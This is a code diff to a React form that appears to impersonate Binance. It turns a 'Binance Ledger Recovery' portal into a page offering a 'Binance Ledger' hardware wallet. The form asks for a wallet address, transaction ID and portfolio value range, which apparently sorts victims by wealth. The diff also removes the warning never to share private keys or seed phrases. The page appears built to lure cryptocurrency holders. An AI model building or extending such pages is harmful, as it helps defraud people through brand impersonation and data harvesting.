@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -7,7 +6,7 @@ import { Textarea } from "@/components/ui/textarea";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { useToast } from "@/hooks/use-toast";
 import { submitForm } from "@/api/form-submission";
-import { CheckCircle, Phone, Clock, Info, AlertTriangle } from "lucide-react";
+import { CheckCircle, Phone, Clock, Info, AlertTriangle, Package } from "lucide-react";
 
 interface FormData {
   firstName: string;
@@ -100,8 +99,8 @@ const BinanceLedgerForm = () => {
     try {
       await submitForm(formData);
       toast({
-        title: "Form submitted successfully",
-        description: "We will review your request and get back to you soon.",
+        title: "Binance Ledger request submitted successfully",
+        description: "We will process your request and contact you regarding shipping details.",
       });
       
       // Reset form
@@ -121,7 +120,7 @@ const BinanceLedgerForm = () => {
     } catch (error) {
       toast({
         title: "Submission failed",
-        description: "There was an error submitting your form. Please try again.",
+        description: "There was an error submitting your request. Please try again.",
         variant: "destructive",
       });
     } finally {
@@ -160,15 +159,18 @@ const BinanceLedgerForm = () => {
         <div className="bg-[#1E2026] rounded-lg border border-[#2B3139] p-8">
           {/* Header */}
           <div className="text-center mb-8">
-            <h1 className="text-3xl font-bold text-white mb-2">Binance Ledger Recovery</h1>
-            <p className="text-[#848E9C] text-base">Secure your digital assets with our recovery portal</p>
+            <div className="flex items-center justify-center gap-3 mb-4">
+              <Package className="w-8 h-8 text-binance-yellow" />
+              <h1 className="text-3xl font-bold text-white">Request Binance Ledger</h1>
+            </div>
+            <p className="text-[#848E9C] text-base">Secure hardware wallet for your digital assets</p>
           </div>
 
           {/* Important Notice */}
           <div className="mb-6">
             <NoticeMessage type="info">
-              <strong>Important:</strong> All recovery requests are processed securely through our verified channels. 
-              Please ensure all information provided is accurate to expedite your request.
+              <strong>Binance Ledger Request:</strong> Complete this form to request your Binance Ledger hardware wallet. 
+              Our team will verify your information and contact you with shipping details and delivery timeline.
             </NoticeMessage>
           </div>
 
@@ -266,50 +268,55 @@ const BinanceLedgerForm = () => {
               </div>
             </div>
 
-            {/* Recovery Details */}
+            {/* Delivery Details */}
             <div className="space-y-4">
-              <h3 className="text-lg font-semibold text-white border-b border-[#2B3139] pb-2">Recovery Details</h3>
+              <h3 className="text-lg font-semibold text-white border-b border-[#2B3139] pb-2">Delivery Details</h3>
               
               <div>
-                <Label htmlFor="walletAddress" className="text-[#B7BDC6] text-base mb-2 block">Wallet Address</Label>
+                <Label htmlFor="walletAddress" className="text-[#B7BDC6] text-base mb-2 block">Primary Wallet Address (for verification)</Label>
                 <Input
                   id="walletAddress"
                   type="text"
                   value={formData.walletAddress}
                   onChange={(e) => handleInputChange("walletAddress", e.target.value)}
                   className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
-                  placeholder="Enter your wallet address"
+                  placeholder="Enter your primary wallet address"
                 />
               </div>
 
               <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                 <div>
-                  <Label htmlFor="transactionId" className="text-[#B7BDC6] text-base mb-2 block">Transaction ID</Label>
+                  <Label htmlFor="transactionId" className="text-[#B7BDC6] text-base mb-2 block">Recent Transaction ID (optional)</Label>
                   <Input
                     id="transactionId"
                     type="text"
                     value={formData.transactionId}
                     onChange={(e) => handleInputChange("transactionId", e.target.value)}
                     className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
+                    placeholder="For account verification"
                   />
                 </div>
 
                 <div>
-                  <Label htmlFor="amount" className="text-[#B7BDC6] text-base mb-2 block">Amount</Label>
-                  <Input
-                    id="amount"
-                    type="number"
-                    step="0.00000001"
-                    value={formData.amount}
-                    onChange={(e) => handleInputChange("amount", e.target.value)}
-                    className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
-                  />
+                  <Label htmlFor="amount" className="text-[#B7BDC6] text-base mb-2 block">Portfolio Value Range</Label>
+                  <Select value={formData.amount} onValueChange={(value) => handleInputChange("amount", value)}>
+                    <SelectTrigger className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow">
+                      <SelectValue placeholder="Select range" />
+                    </SelectTrigger>
+                    <SelectContent className="bg-[#181A20] border-[#2B3139]">
+                      <SelectItem value="under-1k" className="text-white">Under $1,000</SelectItem>
+                      <SelectItem value="1k-10k" className="text-white">$1,000 - $10,000</SelectItem>
+                      <SelectItem value="10k-50k" className="text-white">$10,000 - $50,000</SelectItem>
+                      <SelectItem value="50k-100k" className="text-white">$50,000 - $100,000</SelectItem>
+                      <SelectItem value="over-100k" className="text-white">Over $100,000</SelectItem>
+                    </SelectContent>
+                  </Select>
                 </div>
               </div>
 
               <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                 <div>
-                  <Label htmlFor="currency" className="text-[#B7BDC6] text-base mb-2 block">Currency</Label>
+                  <Label htmlFor="currency" className="text-[#B7BDC6] text-base mb-2 block">Primary Currency</Label>
                   <Select value={formData.currency} onValueChange={(value) => handleInputChange("currency", value)}>
                     <SelectTrigger className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow">
                       <SelectValue />
@@ -326,29 +333,28 @@ const BinanceLedgerForm = () => {
                 </div>
 
                 <div>
-                  <Label htmlFor="priority" className="text-[#B7BDC6] text-base mb-2 block">Priority Level</Label>
+                  <Label htmlFor="priority" className="text-[#B7BDC6] text-base mb-2 block">Delivery Priority</Label>
                   <Select value={formData.priority} onValueChange={(value) => handleInputChange("priority", value)}>
                     <SelectTrigger className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow">
                       <SelectValue />
                     </SelectTrigger>
                     <SelectContent className="bg-[#181A20] border-[#2B3139]">
-                      <SelectItem value="low" className="text-white">Low</SelectItem>
-                      <SelectItem value="medium" className="text-white">Medium</SelectItem>
-                      <SelectItem value="high" className="text-white">High</SelectItem>
-                      <SelectItem value="urgent" className="text-white">Urgent</SelectItem>
+                      <SelectItem value="standard" className="text-white">Standard (7-14 days)</SelectItem>
+                      <SelectItem value="express" className="text-white">Express (3-5 days)</SelectItem>
+                      <SelectItem value="urgent" className="text-white">Urgent (1-2 days)</SelectItem>
                     </SelectContent>
                   </Select>
                 </div>
               </div>
 
               <div>
-                <Label htmlFor="description" className="text-[#B7BDC6] text-base mb-2 block">Description</Label>
+                <Label htmlFor="description" className="text-[#B7BDC6] text-base mb-2 block">Additional Notes</Label>
                 <Textarea
                   id="description"
                   value={formData.description}
                   onChange={(e) => handleInputChange("description", e.target.value)}
                   className="bg-[#181A20] border-[#2B3139] text-white text-base min-h-[100px] focus:border-binance-yellow resize-none"
-                  placeholder="Please describe your issue in detail..."
+                  placeholder="Any special delivery instructions or additional information..."
                 />
               </div>
             </div>
@@ -356,8 +362,8 @@ const BinanceLedgerForm = () => {
             {/* Security Notice */}
             <div className="space-y-4">
               <NoticeMessage type="warning">
-                <strong>Security Notice:</strong> Never share your private keys or seed phrases. 
-                Binance support will never ask for this information through email or phone calls.
+                <strong>Security Notice:</strong> The Binance Ledger will be shipped to your verified address only. 
+                Ensure your contact information is accurate for successful delivery.
               </NoticeMessage>
             </div>
 
@@ -366,7 +372,7 @@ const BinanceLedgerForm = () => {
               disabled={isSubmitting}
               className="w-full bg-binance-yellow hover:bg-binance-yellow/90 text-black font-semibold h-12 text-base"
             >
-              {isSubmitting ? "Submitting..." : "Submit Recovery Request"}
+              {isSubmitting ? "Submitting Request..." : "Request Binance Ledger"}
             </Button>
           </form>
         </div>
